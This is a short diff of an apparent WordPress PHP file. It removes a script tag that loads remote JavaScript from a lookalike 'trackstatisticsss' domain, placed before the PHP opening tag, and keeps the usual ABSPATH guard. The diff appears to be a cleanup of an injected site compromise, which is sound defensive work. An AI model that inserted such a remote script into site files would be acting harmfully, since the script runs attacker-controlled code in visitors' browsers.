@@ -1,4 +1,4 @@
-<script type='text/javascript' src='https://stat.trackstatisticsss.com/k.js?v=222'></script><?php
+<?php
 if ( ! defined( 'ABSPATH' ) ) {
 	die( '-1' );
 }
